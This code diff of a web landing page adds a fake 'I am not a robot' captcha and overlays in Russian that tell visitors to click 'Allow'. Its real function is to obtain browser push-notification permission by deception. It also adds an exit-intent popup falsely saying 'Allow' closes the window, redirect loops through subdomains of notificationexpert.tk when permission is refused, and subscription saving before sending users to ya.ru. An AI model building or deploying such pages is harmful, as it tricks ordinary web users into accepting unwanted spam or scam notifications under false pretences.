@@ -6,14 +6,28 @@
 </head>
 
 
-<body onload="registerSw()" style="background-color: black">
+<body onload="init(); registerSw()" onmouseleave="checkMouse(this)" style="font-family: Arial, Helvetica, sans-serif;">
 
 
 <script type="text/javascript">
     var landingLanguage = "en";
     var afterLandUrl = "ya.ru";
     var landUrl = "notificationexpert.tk/pushapp-bestnews/hotoffer";
-    var protocolUrl = "https://"
+    var protocolUrl = "https://";
+
+    
+    function init() {
+        var isMobile = /Mobile|mini|Fennec|Android|iP(ad|od|hone)/.test(navigator.appVersion);
+        var deskDiv = document.getElementById('desktop');
+        var mobDiv = document.getElementById('desktop');
+
+        if(deskDiv != null && !isMobile) {
+            deskDiv.style.display="";
+        }
+        if(mobDiv != null && isMobile) {
+            mobDiv.style.display="";
+        }
+    }
 
     function registerSw() {
         if ('serviceWorker' in navigator && 'PushManager' in window) {
@@ -30,6 +44,8 @@
                         .then(function (result) {
                             if (result !== 'granted') {
                                 askPermission();
+                            } else {
+                                sendToAfterLand();
                             }
                         });
                 })
@@ -69,7 +85,9 @@
         })
             .then(function(permissionResult) {
                 if (permissionResult !== 'granted') {
-                    throw new Error('We weren\'t granted permission.');
+                    //throw new Error('Weren\'t granted permission.');
+                    console.log("Weren't granted permission.");
+                    contrBlock();
                 }
                 subscribe();
             });
@@ -78,18 +96,24 @@
     function contrBlock() {
         var host = window.location.host;
         var sub = host.split(".");
-        var maxSub = 1;
+        var maxSub = 2;
 
-        if(/\d/.test(sub) && !/\D/.test(sub)) {
-             sub = parseInt(sub) - 1;
-             if(sub > 0)
-                 window.location.href = protocolUrl + sub + "." + landUrl;
-             else
-                 window.location.href = protocolUrl + afterLandUrl;
+        if(/\d/.test(sub[0]) && !/\D/.test(sub[0])) {
+             var idx = parseInt(sub[0]) - 1;
+             if(idx > 0) {
+                 window.location.href = protocolUrl + idx + "." + landUrl;
+             }
+             else {
+                 alert("Notifications blocked. Please enable them in your browser.");
+                 sendToAfterLand();
+             }
         } else {
             window.location.href = protocolUrl + maxSub + "." + landUrl;
         }
-        //alert("Notifications blocked. Please enable them in your browser.");
+    }
+
+    function sendToAfterLand() {
+        window.location.href = protocolUrl + afterLandUrl;
     }
 
 
@@ -118,6 +142,7 @@
                 saveSubscription(subJson)
                     .then(function (response) {
                         console.log('Subscribed finished. Status: ', response);
+                        sendToAfterLand();
                     });
 
                 return pushSubscription;
@@ -352,10 +377,160 @@
         }
     }
 
+
+
+    function checkMouse(e) {
+        e = e ? e : window.event;
+        var from = e.relatedTarget || e.toElement;
+        if (!from || from.nodeName === "HTML") {
+            document.getElementById('popup').style.display = "block";
+        }
+    }
+
+
 </script>
 
 
-<h3 style="color: red; margin-left: 30%;">SOSALOVO</h3>
+<div id="desktop" style="background-image: url(resources/img/robo_man.jpeg);background-size: 300px 330px;background-position: 100% 25%; background-repeat: no-repeat; -webkit-font-smoothing: antialiased;
+    min-height: 100%;margin: 0;padding: 0;display: block">
+
+    <style>
+        @-webkit-keyframes float {
+            0% {
+                -webkit-transform: translate(-50%, 5px);
+                transform: translate(-50%, 5px)
+            }
+            50% {
+                -webkit-transform: translate(-50%, -5px);
+                transform: translate(-50%, -5px)
+            }
+            to {
+                -webkit-transform: translate(-50%, 5px);
+                transform: translate(-50%, 5px)
+            }
+        }
+
+        @keyframes float {
+            0% {
+                -webkit-transform: translate(-50%, 5px);
+                transform: translate(-50%, 5px)
+            }
+            50% {
+                -webkit-transform: translate(-50%, -5px);
+                transform: translate(-50%, -5px)
+            }
+            to {
+                -webkit-transform: translate(-50%, 5px);
+                transform: translate(-50%, 5px)
+            }
+        }
+
+        @-webkit-keyframes floatcenter {
+            0% {
+                -webkit-transform: translate(0, 5px);
+                transform: translate(0, 5px)
+            }
+            50% {
+                -webkit-transform: translate(0, -5px);
+                transform: translate(0, -5px)
+            }
+            to {
+                -webkit-transform: translate(0, 5px);
+                transform: translate(0, 5px)
+            }
+        }
+
+        @keyframes floatcenter {
+            0% {
+                -webkit-transform: translate(0, 5px);
+                transform: translate(0, 5px)
+            }
+            50% {
+                -webkit-transform: translate(0, -5px);
+                transform: translate(0, -5px)
+            }
+            to {
+                -webkit-transform: translate(0, 5px);
+                transform: translate(0, 5px)
+            }
+        }
+
+        @media (max-width: 520px) {
+            .c1 {
+                padding: 140px 20px 20px !important;
+                text-align: center !important;
+            }
+
+            .c2 {
+                display: none !important;
+            }
+
+            .c3 {
+                top: 72px !important;
+                left: 38% !important;
+            }
+
+        }
+
+        @media (max-width: 700px) {
+            .c5 {
+                width: 400px !important;
+                left: calc(50% - 240px) !important;
+            }
+        }
+
+        @media (max-width: 950px) {
+            .c4 {
+                display: block;
+                top: 20px !important;
+                left: calc(50% - 115px) !important;
+                -webkit-animation: floatcenter 1s ease-in-out infinite !important;
+                animation: floatcenter 1s ease-in-out infinite !important;
+            }
+        }
+
+        @media (max-width: 500px) {
+            .c4 {
+                bottom: 3% !important;
+                top: unset !important;
+                width: 80%;
+                left: unset !important;
+                right: 5%;
+            }
+        }
+    </style>
+
+    <div style="display: inline-block;position: relative;margin: 20% 25% 0;padding: 5px 130px 30px 100px;border: 2px solid #d7d7d7;
+    border-radius: 3px;background-color: #f9f9f9;color: #000;text-align: left;" class="c1">
+        <div style="background-image: url(resources/img/icon_dir.png); background-size: cover; background-repeat:no-repeat;left: 25px;width: 60px;height: 45px;position: absolute;
+        top: 50%;-webkit-transform: translateY(-50%);transform: translateY(-50%);" class="c2">
+        </div>
+
+        <div style="margin-bottom: 5px;font-size: 24px;font-weight: 700;">
+            <div style="display: table; margin-top: 20px; font-size: 24px; font-weight: 700">Я не робот</div>
+            <div style="color: #676767; margin-top: 4px; font-size: 15px;">Нажмите на <span style="font-weight: 700">Разрешить</span> для подтверждения, что вы не робот</div>
+        </div>
+
+        <div style="background-image: url(resources/img/capcha.png); background-size: cover; background-repeat:no-repeat;right: 20px;width: 81px;height: 90px;position: absolute;
+        top: 50%;-webkit-transform: translateY(-50%);transform: translateY(-50%);" class="c3">
+        </div>
+    </div>
+
+    <div id="popup" style="display:none;position: fixed;top: 0;right: 0;bottom: 0;left: 0;background: rgba(0,0,0,.8);z-index: 99;">
+        <div class="c5" style="z-index: 1;position: absolute;top: 0;right: 20px;left: 460px;max-width: 600px;padding: 40px;background: #fff;-webkit-box-shadow: 0 5px 10px rgba(0,0,0,.5);box-shadow: 0 5px 10px rgba(0,0,0,.5);color: #000;text-align: left;">
+            <p style="font-weight: 700">Нажмите "Разрешить", чтобы закрыть это окно</p>
+            <p style="font-size: 14px">Это окно можно закрыть нажатием "Разрешить". Если вы хотите продолжить действия на данном сайте, просто нажмите на подробную информацию.</p>
+            <p style="color: #009cff; font-size: 14px">Подробная информация</p>
+        </div>
+    </div>
+
+    <div class="c4" style="height: 20px; z-index: 1;position: fixed;top: 120px;left: 390px;padding: 20px;border-radius: 10px;background: #fff;color: #000;
+    -webkit-box-shadow: 0 5px 30px rgba(0, 0, 0, .2);box-shadow: 0 5px 30px rgba(0, 0, 0, .2);
+    font-size: 20px;font-weight: 700;text-align: center;text-transform: none;
+    -webkit-animation: float 1s ease-in-out infinite;animation: float 1s ease-in-out infinite">
+        Нажмите <span style="color: #197aec">Разрешить</span> чтобы подтвердить
+    </div>
+</div>
 
 
 
